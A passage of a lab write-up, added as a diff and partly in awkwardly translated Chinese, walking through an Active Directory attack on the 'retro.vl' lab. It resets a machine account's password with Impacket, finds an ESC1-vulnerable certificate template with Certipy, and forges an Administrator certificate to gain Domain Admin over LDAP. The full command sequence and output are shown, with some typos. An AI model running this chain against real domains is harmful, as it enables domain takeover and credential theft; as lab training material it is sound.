@@ -238,3 +238,157 @@ James
 session setup failed: NT_STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
 ```
 #### 因为我们得到NT状态NOLOGON工作站信任帐户，而不是NT状态登录失败机器账户，看起来是这样的。现在，应该更改密码以成功进行身份验证。对于这个更改，passpasswd.py from可以使用Impacket。
+```
+[★]$ ls /usr/share/doc/python3-impacket/examples/changepasswd.py
+/usr/share/doc/python3-impacket/examples/changepasswd.py
+[★]$ cp /usr/share/doc/python3-impacket/examples/changepasswd.py .
+
+[★]$ python3  changepasswd.py retro.vl/'banking$':banking@10.129.234.44 -newpass 'qwerty1!' -p rpc-samr
+Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Changing the password of retro.vl\banking$
+[*] Connecting to DCE/RPC as retro.vl\banking$
+[*] Password was changed successfully.
+
+[★]$ crackmapexec smb retro.vl -u 'bankings$' -p 'qwerty1!'
+[*] First time use detected
+[*] Creating home directory structure
+[*] Creating missing folder logs
+[*] Creating missing folder modules
+[*] Creating missing folder protocols
+[*] Creating missing folder workspaces
+[*] Creating missing folder obfuscated_scripts
+[*] Creating missing folder screenshots
+[*] Creating default workspace
+[*] Initializing MSSQL protocol database
+[*] Initializing WINRM protocol database
+[*] Initializing LDAP protocol database
+[*] Initializing SMB protocol database
+[*] Initializing SSH protocol database
+[*] Initializing VNC protocol database
+[*] Initializing WMI protocol database
+[*] Initializing FTP protocol database
+[*] Initializing RDP protocol database
+[*] Copying default configuration file
+SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
+SMB         10.129.234.44   445    DC               [+] retro.vl\bankings$:qwerty1!
+```
+#### 有了banking$ machine帐户的凭据，应该进行进一步的枚举。让我们检查一下活动目录证书服务的存在。
+```
+[★]$ nxc ldap retro.vl -u "banking$" -p 'qwerty1!' -M adcs
+SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
+LDAP        10.129.234.44   389    DC               [+] retro.vl\banking$:qwerty1!
+ADCS        10.129.234.44   389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
+ADCS        10.129.234.44   389    DC               Found PKI Enrollment Server: DC.retro.vl
+ADCS        10.129.234.44   389    DC               Found CN: retro-DC-CA
+```
+#### 在本例中，安装了ADCS，证书颁发机构标识为retrodc - ca。证书应该是用于进一步枚举证书服务。
+```
+[★]$ which certipy-ad
+[★]$ which certipy
+/usr/local/bin/certipy
+
+[★]$ certipy find -u 'banking$' -p 'qwerty1!' -dc-ip 10.129.234.44 -vulnerable -stdout
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+<SNIP>
+    CA Name                             : retro-DC-CA
+   </SNIP>
+  <SNIP>
+    Template Name                       : RetroClients
+    </SNIP>
+    Minimum RSA Key Length              : 4096
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : RETRO.VL\Domain Admins
+                                          RETRO.VL\Domain Computers
+                                          RETRO.VL\Enterprise Admins
+      <SNIP>
+    [!] Vulnerabilities
+      ESC1                              : 'RETRO.VL\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
+</SNIP>
+```
+#### 从证书输出中，我们看到复古dc - ca证书颁发机构容易受到ESC1攻击，这允许攻击者为另一个用户请求证书并使用该证书进行身份验证域。在注册权限中，我们看到BANKING$所在的域计算机组的成员被允许注册到模板中。证书输出的CA名称、模板名称和最小RSA密钥长度应为指出。使用这些，应该从RetroClients模板请求一个新的证书，进行模拟Administrator用户。
+```
+[★]$ rpcclient -U 'retrovl\banking$%qwerty1!' 10.129.234.44
+rpcclient $> lookupnames Administrator
+Administrator S-1-5-21-2983547755-698260136-4283918172-500 (User: 1)
+rpcclient $>exit
+```
+```
+[★]$ python3 -m venv certipy-env
+[★]$ source certipy-env/bin/activate
+
+(venv)[★]$ certipy req -u 'banking$' -p 'qwerty1!' -dc-ip 10.129.234.44 -ca retro-DC-CA -template RetroClients -upn Administrator -debug -target dc.retro.vl -key-size 4096 -sid S-1-5-21-2983547755-698260136-4283918172-500 -timeout 60
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[+] Trying to resolve 'dc.retro.vl' at '10.129.234.44'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:10.129.234.44[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:10.129.234.44[\pipe\cert]
+[*] Successfully requested certificate
+[*] Request ID is 11
+[*] Got certificate with UPN 'Administrator'
+[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
+[*] Saved certificate and private key to 'administrator.pfx'
+
+
+[★]$ sudo su
+[root]#certipy req -u 'BANKING$@retro.vl' -p 'qwerty1!' -ca retro-DC-CA -template RetroClients -upn Administrator@retro.vl -debug -target dc.retro.vl -sid S-1-5-21-2983547755-698260136-4283918172-500 -key-size 4096 -timeout 60
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[+] Trying to resolve 'dc.retro.vl' at '10.129.234.44'
+[+] Trying to resolve 'RETRO.VL' at '10.129.234.44'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:10.129.234.44[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:10.129.234.44[\pipe\cert]
+[*] Successfully requested certificate
+[*] Request ID is 12
+[*] Got certificate with UPN 'Administrator@retro.vl'
+[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
+[*] Saved certificate and private key to 'administrator.pfx'
+
+certipy auth -pfx administrator.pfx -dc-ip 10.129.234.44
+
+```
+#### 然后，应该使用该证书对域控制器进行身份验证，并检索的RC4哈希值管理员用户
+```
+//lookupsid.py retro.vl/BANKING$:qwerty1!@dc.retro.vl
+```
+
+#### 注意：如果出现KRB AP ERR SKEW等错误，请使用sudo ntpudate retro.Vl来同步你的时间域控制器
+#### Kerberos 的铁规则：客户端与域控时间差不能超过 5 分钟
+```
+[★]$ sudo ntpdate retro.vl
+2026-01-01 02:15:20.579974 (-0600) -0.083656 +/- 0.004694 retro.vl 10.129.234.44 s1 no-leap
+```
+#### 这是为了防止：重放攻击 离线票据滥用
+
+
+#### 已经以 Domain Admin（Administrator）身份，成功 LDAP 认证到 DC
+#### 这不是 Linux shell，也不是 Windows cmd / PowerShell，这是 Certipy 的 LDAP 交互式 Shell
+```
+[★]$ certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'retro.vl' -dc-ip 10.129.234.44 -ldap-shell
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Connecting to 'ldaps://10.129.234.44:636'
+[*] Authenticated to '10.129.234.44' as: u:RETRO\Administrator
+Type help for list of commands
+
+# whoami
+u:RETRO\Administrator
+# exit 
+
+[★]$ certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'retro.vl' -dc-ip 10.129.234.44 
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@retro.vl
+[*] Trying to get TGT...
+[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
+
+certipy auth -pfx administartor.pfx -dc-ip 10.129.234.44
+
+```
+#### 要的这种输出（NT hash），只能在 certipy auth 的“非 ldap-shell 模式”下得到
+#### 这个域控不支持“用证书换 Kerberos TGT”（PKINIT）
